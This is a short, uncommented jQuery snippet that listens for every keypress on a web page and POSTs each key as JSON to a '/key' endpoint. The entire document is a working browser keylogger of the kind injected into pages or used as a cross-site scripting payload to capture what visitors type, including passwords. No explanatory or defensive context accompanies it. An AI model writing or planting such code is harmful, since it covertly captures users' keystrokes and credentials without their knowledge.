$(document).on('keypress', function(e) {
  fetch('/key', {
    headers: { "Content-Type": "application/json" },
    method: 'POST',
    body: JSON.stringify({ keystroke: e.key })
  });
});
